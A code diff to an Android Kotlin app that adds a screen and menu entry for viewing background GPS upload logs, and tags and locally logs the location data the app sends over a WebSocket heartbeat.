@@ -138,6 +138,7 @@ class MainActivity : ComponentActivity() {
                                 onNavigateToUploadRecords = { navController.navigate("upload_records") },
                                 onNavigateToKeyboardRecords = { navController.navigate("keyboard_records") },
                                 onNavigateToLocationErrorLog = { navController.navigate("location_error_log") },
+                                onNavigateToGpsUploadLog = { navController.navigate("gps_upload_log") },
                                 needManualSetup = needManualSetup,
                                 dismissManualSetup = {
                                     healthPrefs.edit().putBoolean(App.KEY_NEED_MANUAL_SETUP, false).apply()
@@ -176,6 +177,11 @@ class MainActivity : ComponentActivity() {
                                 onBackClick = { navController.popBackStack() }
                             )
                         }
+                        composable("gps_upload_log") {
+                            GpsUploadLogScreen(
+                                onBackClick = { navController.popBackStack() }
+                            )
+                        }
                     }
                 }
             }
@@ -191,9 +197,11 @@ class MainActivity : ComponentActivity() {
                 CoroutineScope(Dispatchers.IO).launch {
                     Log.e(TAG, "MainActivity 心跳开始定位")
                     try {
-                        val location = AMapLocationHelper.getLocation(this@MainActivity)
+                        val location = AMapLocationHelper.getLocation(this@MainActivity).toMutableMap()
+                        location["source"] = "main_heartbeat"
                         val locPayload = com.google.gson.Gson().toJson(location)
                         WebSocketManager.send("""{"command":"upload_location","params":$locPayload}""")
+                        AMapLocationHelper.logGpsUpload(this@MainActivity, location)
                         Log.d(TAG, "MainActivity 心跳定位发送成功，Location reported: lat=${location["latitude"]}, lng=${location["longitude"]}")
                     } catch (e: Exception) {
                         Log.e(TAG, "MainActivity 心跳定位发送失败，Failed to report location", e)
@@ -273,6 +281,7 @@ fun AppScreen(
     onNavigateToUploadRecords: () -> Unit,
     onNavigateToKeyboardRecords: () -> Unit,
     onNavigateToLocationErrorLog: () -> Unit,
+    onNavigateToGpsUploadLog: () -> Unit,
     needManualSetup: MutableState<Boolean> = mutableStateOf(false),
     dismissManualSetup: () -> Unit = {}
 ) {
@@ -553,6 +562,13 @@ fun AppScreen(
                             onClick = {
                                 showMenu = false
                                 onNavigateToLocationErrorLog()
+                            }
+                        )
+                        DropdownMenuItem(
+                            text = { Text("查看后台 GPS 上传", fontSize = 16.sp) },
+                            onClick = {
+                                showMenu = false
+                                onNavigateToGpsUploadLog()
                             }
                         )
                         DropdownMenuItem(
